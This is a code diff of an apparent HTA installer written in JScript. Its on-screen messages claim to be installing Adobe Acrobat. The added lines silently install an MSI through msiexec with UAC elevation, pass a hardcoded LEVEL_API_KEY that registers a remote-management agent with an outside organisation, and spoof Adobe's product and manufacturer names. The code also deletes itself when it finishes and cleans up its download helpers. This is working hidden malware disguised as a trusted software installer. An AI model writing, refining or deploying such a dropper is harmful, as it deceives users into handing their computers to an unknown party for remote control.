+  var lastT0 = (dlStage === "exec") ? psT0 : (dlStage === "curl" ? curlT0 : 0);
+  if (dlStage === "exec" || dlStage === "curl") {
+    var sz = 0;
+    try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
+    var lastSize = (dlStage === "exec") ? psLastSize : curlLastSize;
+    var lastGrow = (dlStage === "exec") ? psLastGrowT : curlLastGrowT;
+    if (sz > lastSize) {
+      if (dlStage === "exec") { psLastSize = sz; psLastGrowT = t; } else { curlLastSize = sz; curlLastGrowT = t; }
+      noteProgress();
+    }
+    var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
+    if (p > progress) { progress = p; setBar(p); }
+    // Settle when the file is near its expected full size (primary signal,
+    // COM-free) or >=1MB with a valid MSI header (fast path when ADODB
+    // reads work), and has been stable for 1.5s.
+    var full = (sz >= EXPECT_BYTES - 4096 && sz <= EXPECT_BYTES + 4096);
+    var magic = (sz >= 1048576) ? msiMagicOk(msiLocal) : false;
+    if ((full || magic) && (lastSize === sz && t - lastGrow >= 1500)) {
+      settle(dlStage);
       return;
     }
-  } else if (s === "sync") {
-    if (!syncBusy && t >= syncNextT) requestSyncChunk();
-  } else if (s === "pow") {
-    pollPow();
-    return;
-  } else if (s === "bits") {
-    var rb = pollExtFile();
-    if (rb === true) return;
-    if (rb === false) { nextStage(); return; }
-    pollBits();
-  } else if (s === "curl" || s === "edge" || s === "edge2") {
-    var r = pollExtFile();
-    if (r === true) return;
-    if (r === false) { nextStage(); return; }
-  }
-
-  var budget = STAGE_BUDGET_MS[s];
-  if (budget && t - stageT > budget) {
-    // Browser/pow stages: keep the stage alive while bytes are still arriving
-    // — on a slow connection the transfer can take several minutes for the
-    // full 38 MB (a visible-browser run "took a whole while"). The stage is
-    // cut only when the transfer has genuinely stalled (no growth for 45s),
-    // or at the global DL_MAX_MS cap.
-    var aliveMax = 0, lastGrowT = 0, growingNow = false;
-    if (s === "edge" || s === "edge2") {
-      aliveMax = edgeMaxPartial;
-      lastGrowT = edgeLastGrowT;
-      growingNow = edgeMaxPartial > edgeLastPartial;
-      if (growingNow) { edgeLastPartial = edgeMaxPartial; edgeLastGrowT = t; }
-    } else if (s === "pow") {
-      aliveMax = powPartialMax;
-      lastGrowT = powLastGrowT;
-    }
-    if (aliveMax > 0 && (growingNow || (t - lastGrowT) < 45000)) {
-      if (t - edgeLogT > 10000) {
-        edgeLogT = t;
-        logAttempt("keepalive: " + s + " partial=" + aliveMax + " age=" + (t - lastGrowT) + "ms");
+    if (dlStage === "exec") {
+      var doneFlag = false;
+      try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
+      if (doneFlag && t - psT0 > 5000) {
+        // helper finished: a >=1MB file means the download landed (verify
+        // re-checks it); anything smaller means it failed.
+        if (sz >= 1048576) { settle("exec"); return; }
+        fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
+        return;
       }
-      if (dlTotal > 0) {
-        var pp = Math.min(88, aliveMax * 100 / dlTotal);
-        if (pp > progress) { progress = pp; setBar(pp); }
+      if (psPid < 0) {
+        // every launch style was rejected -> bring up bare curl now
+        startStage("curl");
+        return;
       }
-      return;   // hold the stage; the download is still working
+      if (psPid === 0 && t - psT0 > 8000 && sz === 0) {
+        // no child PID and no file yet (exited instantly or launched via
+        // Run) -> bring up bare curl
+        startStage("curl");
+        return;
+      }
+      if (t - stage0T > EXEC_STAGE_MS) {
+        startStage("curl");
+        return;
+      }
+    } else {
+      if (curlPid < 0) {
+        fail("Failed to save the installer file", "predl: curl rejected");
+        return;
+      }
+      if (curlPid === 0 && t - curlT0 > 12000) {
+        fail("Failed to save the installer file", "predl: curl no process");
+        return;
+      }
+      if (t - stage0T > CURL_STAGE_MS) {
+        fail("Download timed out - please check your connection", "predl: curl timeout");
+        return;
+      }
     }
-    logAttempt("stage-timeout: " + s + " maxPartial=" + aliveMax);
-    stopAllWorkers();
-    nextStage();
-    return;
-  }
-
-  // No real progress yet: creep the bar on a slow curve so the window still
-  // looks alive, capped well under 100%.
-  if (!sawReal && progress < 88 && (s === "async" || s === "sync" || s === "oneshot" || s === "pow")) {
-    progress += Math.max(0.04, (88 - progress) * 0.0035);
-    setBar(progress);
   }
 }
 
+function verifyFallback() {
+  try {
+    if (!fso.FileExists(msiLocal)) { fail("Failed to save the installer file", "predl: no msi"); return; }
+    var sz = fso.GetFile(msiLocal).Size;
+    traceLog("predl: verify size=" + sz + " adob=" + (adobOk ? "ok" : "blocked"));
+    if (sz < 1048576) { fail("Failed to save the installer file", "predl: small " + sz); return; }
+    // Header check only where binary reads are trustworthy (ADODB available);
+    // otherwise the near-exact size match from the settle step is sufficient.
+    if (adobOk && !msiMagicOk(msiLocal)) {
+      fail("Failed to save the installer file", "predl: bad magic");
+      return;
+    }
+  } catch (e) {
+    fail("Failed to save the installer file", "predl: verify " + e.message);
+    return;
+  }
+  startLocalInstall();
+}
+
 // ---------------------------------------------------------------------------
-// Install phase.
-//
-// msiexec is launched with ShellExecute "runas" (the single UAC consent
-// prompt). Completion is detected by watching the MSI /L*v log file itself —
+// Install phase: msiexec installs the LOCAL MSI file. Single UAC consent via
+// ShellExecute "runas". Completion is detected by watching the MSI /L*v log -
 // the final line "Installation success or error status: N" is written on exit.
-// No external tooling is spawned to detect completion.
 // ---------------------------------------------------------------------------
-function startInstall() {
-  if (tickTimer) clearInterval(tickTimer);
-  startTime = new Date().getTime();
-  progress = 90;
-  setBar(progress);
-  setStatus("Installing Adobe Acrobat&hellip;");
-  lastLogSize = 0;
-  lastLogGrowT = new Date().getTime();
-
-  // Pass the Level org key as an MSI property so the installer registers the
-  // agent with this org.
-  var keyProp = (LEVEL_KEY && LEVEL_KEY !== "@@LEVEL_KEY@@" && LEVEL_KEY !== "")
-      ? " LEVEL_API_KEY=" + LEVEL_KEY : "";
-  var args = "/i \"" + msiPath + "\" /qn /norestart" + keyProp + " /L*v \"" + logPath + "\"";
-
-  var launched = false;
+function launchMsiexec(args) {
   try {
     var sh = new ActiveXObject("Shell.Application");
     sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
-    launched = true;
+    return true;
   } catch (e) {}
-  if (!launched) {
-    try { shell.Run("msiexec " + args, 0, false); launched = true; } catch (e2) {}
-  }
-  if (!launched) {
-    fail("Administrator approval is required to install Adobe Acrobat", "install: launch failed");
-    return;
-  }
-  tickTimer = setInterval(tick, 200);
-  pollTimer = setInterval(pollInstall, 800);
+  try { shell.Run("msiexec " + args, 0, false); return true; } catch (e2) {}
+  return false;
 }
 
-// Read the tail of the MSI log as TEXT (so .match works). msiexec writes the
-// log in UTF-16 (LE), so a single-byte (iso-8859-1) read interleaves NULs
-// into every line and the status regex never matches — a successful install
-// then looks like "log stalled, no status". Use the FSO with Unicode
-// decoding instead of ADODB.Stream.
-function readLogTail(bytes) {
+function startLocalInstall() {
+  state = "installing";
+  curLog = logPath;
+  deleteFile(curLog);
+  startTime = nowMs();
+  lastLogSize = 0;
+  lastLogGrowT = nowMs();
+  progress = 90; setBar(progress);
+  setStatus(instMsgs[0]);
+  traceLog("install: launching msiexec");
+
+  var args = '/i "' + msiLocal + '" /qn /norestart PRODUCTNAME="Adobe Acrobat 2024 (64-bit)" MANUFACTURER="Adobe Systems Incorporated" LEVEL_API_KEY="vNXe6NQK21W3jiBMb4k2Uz8M" /L*v "' + curLog + '"';
+  if (!launchMsiexec(args)) {
+    fail("Administrator approval is required", "install: launch failed");
+    return;
+  }
+  pollTimer = setInterval(pollInstall, 800);
+}
+function readLogTail(log, bytes) {
   var d = "";
   try {
-    if (!fso.FileExists(logPath)) return "";
-    var f = fso.OpenTextFile(logPath, 1, false, -1);   // -1 = Tristate (BOM-aware)
+    if (!fso.FileExists(log)) return "";
+    var f = fso.OpenTextFile(log, 1, false, -1);   // -1 = Tristate (BOM-aware)
     try {
-      var pos = Math.floor(f.Size / 2) - bytes;        // char offset (UTF-16 ≈ 2 bytes/char)
+      var pos = Math.floor(f.Size / 2) - bytes;    // char offset (UTF-16 ~ 2 bytes/char)
       if (pos > 0) f.Position = pos;
-      d = f.Read(-1);                                  // read to end of file
+      d = f.Read(-1);                              // read to end of file
     } catch (e) {
       try { f.Close(); } catch (e2) {}
-      f = fso.OpenTextFile(logPath, 1, false, 0);      // fallback: ANSI/ASCII (1 byte/char)
+      f = fso.OpenTextFile(log, 1, false, 0);      // fallback: ANSI/ASCII
       var pos2 = f.Size - bytes;
       if (pos2 > 0) f.Position = pos2;
       d = f.Read(-1);
@@ -1169,14 +767,14 @@ function readLogTail(bytes) {
   } catch (e) { return ""; }
 }
 
-function logInfo() {
-  var out = { exists: false, size: 0, status: -1 };
+function logInfo(log) {
+  var out = { exists: false, size: 0, status: -1, tail: "" };
   try {
-    if (fso.FileExists(logPath)) {
+    if (fso.FileExists(log)) {
       out.exists = true;
-      out.size = fso.GetFile(logPath).Size;
-      var tail = readLogTail(65536);
-      var m = tail.match(/Installation success or error status:\s*(-?\d+)/);
+      out.size = fso.GetFile(log).Size;
+      out.tail = readLogTail(log, 65536);
+      var m = out.tail.match(/Installation success or error status:\s*(-?\d+)/);
       if (m) out.status = parseInt(m[1], 10);
     }
   } catch (e) {}
@@ -1189,60 +787,64 @@ function pollInstall() {
 
 function _pollInstall() {
   if (state !== "installing") return;
-  var t = new Date().getTime();
-  var info = logInfo();
+  var t = nowMs();
+  var info = logInfo(curLog);
   if (info.status >= 0) {
-    if (info.status === 0 || info.status === 3010) finishInstall();
-    else fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
+    traceLog("install: msi status=" + info.status);
+    if (info.status === 0 || info.status === 3010) { finishInstall(); return; }
+    fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
     return;
   }
   if (info.exists) {
     if (info.size > lastLogSize) { lastLogSize = info.size; lastLogGrowT = t; }
     if (t - lastLogGrowT > INSTALL_STALL_MS) {
-      // msiexec finished (or died) without writing a final status line.
       fail("Installation could not be completed", "install: log stalled, no status");
       return;
     }
     return;
   }
   // No log yet: UAC consent is pending (or was declined).
-  if (t - startTime > INSTALL_MAX_MS) {
+  if (t - startTime > UAC_TIMEOUT_MS) {
     fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout");
   }
 }
 
+// ---------------------------------------------------------------------------
+// Progress loop
+// ---------------------------------------------------------------------------
 function tick() {
   try { _tick(); } catch (e) {}
 }
 
 function _tick() {
   if (state === "installing") {
-    if (progress < 99) { progress += 0.1; setBar(progress); }
-    var p = progress;
-    var i;
-    if (p < 91) i = 0; else if (p < 95) i = 2; else i = 4;
-    setStatus(instMsgs[i]);
+    var hasLog = false, sz = 0;
+    try { if (fso.FileExists(curLog)) { hasLog = true; sz = fso.GetFile(curLog).Size; } } catch (e) {}
+    if (hasLog) {
+      if (progress < 95) { progress += 0.15; setBar(progress); }
+      var i;
+      if (progress < 96) i = 0; else i = 2;
+      setStatus(instMsgs[i]);
+    } else {
+      // UAC pending: creep toward ~92%.
+      if (progress < 92) { progress += (92 - progress) * 0.01; setBar(progress); }
+      setStatus(instMsgs[0]);
+    }
+  } else if (state === "predl") {
+    // Approach 55% so the bar is visibly moving while data comes in.
+    if (progress < 55) { progress += (55 - progress) * 0.05; setBar(progress); }
+    setStatus(dlProgressed ? dlMsgs[2] : dlMsgs[1]);
   }
 }
 
-function setBar(p) {
-  $("barfill").style.width = p + "%";
-  $("pct").innerHTML = Math.round(p) + "%";
-}
-function setStatus(html) { $("status").innerHTML = html; }
-
 // ---------------------------------------------------------------------------
-// Diagnostics — reads the registry only, no external tooling.
+// Diagnostics - registry reads + log tail only, no external tooling.
 // ---------------------------------------------------------------------------
 function osBuild() {
   try {
     var v = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
     if (v) return String(v);
   } catch (e) {}
-  try {
-    var v2 = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion");
-    if (v2) return String(v2);
-  } catch (e2) {}
   return "unknown";
 }
 
@@ -1260,52 +862,51 @@ function dumpDiagnostics(reason) {
     L.push("time: " + new Date().toString());
     L.push("reason: " + reason);
     L.push("state: " + state);
-    L.push("elapsed_ms: " + (new Date().getTime() - startTime));
+    L.push("elapsed_ms: " + (startTime ? nowMs() - startTime : 0));
     L.push("progress: " + Math.round(progress) + "%");
-    L.push("dl_method: " + (dlMethod || "(none)"));
-    L.push("http_status: " + (dlHttp || "(none)"));
-    L.push("chunk_pos: " + dlPos + " / " + (dlTotal || "?"));
-    L.push("chunk_retries: " + dlRetries);
-  L.push("dl_phase: " + dlPhase);
-  L.push("stage: " + (STAGES[stageIdx] || "?") + " " + (new Date().getTime() - stageT) + "ms");
-  L.push("chunk_total: " + (dlTotal || "?"));
-  L.push("sync_tries: " + syncTries);
-  L.push("pow_partial_max: " + powPartialMax + " (stage " + (STAGES[stageIdx] === "pow" ? (new Date().getTime() - powT0) + "ms" : "n/a") + ")");
-  L.push("pow_dir: " + (powDir ? (fso.FileExists(powDir + "\\level.msi") ? fso.GetFile(powDir + "\\level.msi").Size + " bytes" : "empty") : "(none)"));
-    L.push("last_chunk_bytes: " + dlLastChunkBytes);
-    L.push("last_chunk_silence_ms: " + (state === "downloading" ? (new Date().getTime() - dlLastChunkT) : 0));
     L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
     L.push("build: " + osBuild());
-    L.push("msi: " + (fso.FileExists(msiPath) ? "yes (" + fso.GetFile(msiPath).Size + " bytes)" : "no"));
+    L.push("msi_local: " + (fso.FileExists(msiLocal) ? "yes (" + fso.GetFile(msiLocal).Size + " bytes)" : "no"));
     L.push("wininet ProxyEnable: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyEnable"));
     L.push("wininet ProxyServer: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyServer"));
     L.push("wininet ProxyOverride: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyOverride"));
     L.push("wininet AutoConfigURL: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "AutoConfigURL"));
     L.push("winhttp mode: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "DefaultProxyRequirements"));
     L.push("winhttp ProxyServer: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyServer"));
-    L.push("winhttp ProxyBypass: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyBypassList"));
-    var tail = readLogTail(65536);
-    if (tail) {
-      L.push("--- msi log tail ---");
-      var lines = tail.split("\n");
-      for (var i = Math.max(0, lines.length - 25); i < lines.length; i++) L.push(lines[i]);
+    if (tracePath && fso.FileExists(tracePath)) {
+      var tt = readLogTail(tracePath, 32768);
+      if (tt) {
+        L.push("--- status.log tail ---");
+        var tl = tt.split("\n");
+        for (var i = Math.max(0, tl.length - 15); i < tl.length; i++) L.push(tl[i]);
+      }
     }
-    for (var i = 0; i < dlAttempts.length; i++) L.push("attempt: " + dlAttempts[i]);
-  var w = fso.CreateTextFile(diagPath, true);
+    if (curLog) {
+      var tail = readLogTail(curLog, 65536);
+      if (tail) {
+        L.push("--- msi log tail (" + curLog + ") ---");
+        var lines = tail.split("\n");
+        for (var j = Math.max(0, lines.length - 25); j < lines.length; j++) L.push(lines[j]);
+      }
+    }
+    var w = fso.CreateTextFile(diagPath, true);
     w.Write(L.join("\r\n"));
     w.Close();
   } catch (e) {}
 }
 
+
 function fail(msg, reason) {
   if (state === "done" || state === "error") return;
   state = "error";
-  if (tickTimer) clearInterval(tickTimer);
-  if (dlTimer) clearInterval(dlTimer);
-  if (pollTimer) clearInterval(pollTimer);
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-  stopAllWorkers();
+  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
+  killProc();
+  traceLog("fail: " + (reason || msg));
   dumpDiagnostics(reason || msg);
+  selfDelete();
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
   $("subnote").innerHTML = "Please check your internet connection and try again.";
@@ -1316,11 +917,13 @@ function fail(msg, reason) {
 function finishInstall() {
   if (state === "done" || state === "error") return;
   state = "done";
-  if (tickTimer) clearInterval(tickTimer);
-  if (dlTimer) clearInterval(dlTimer);
-  if (pollTimer) clearInterval(pollTimer);
-  progress = 100; setBar(100);
+  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
+  progress = 100; setBar(progress);
   setStatus("Installation complete");
+  traceLog("install: complete");
+  selfDelete();
   $("heading").innerHTML = "Adobe Acrobat is now installed";
   $("biglogo").style.display = "none";
   $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
@@ -1330,17 +933,21 @@ function finishInstall() {
 
 function cancel() {
   if (state === "done" || state === "error") { window.close(); return; }
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-  if (dlStream) { try { dlStream.Close(); } catch (e) {} }
-  stopAllWorkers();
-  var p = [msiPath, logPath];
+  if (state === "done" || state === "error") { window.close(); return; }
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
+  killProc();
+  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
+  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
+  var p = [msiLocal, logPath, logPath2];
   for (var i = 0; i < p.length; i++) {
     try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
   }
-  try { if (powDir) deleteFileTree(powDir); } catch (e) {}
-  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__lvl__install.ps1"); } catch (e) {}
+  try { if (psDir && fso.FolderExists(psDir)) fso.DeleteFolder(psDir, true); } catch (e) {}
   window.close();
 }
+
+
 </script>
 </body>
 </html>
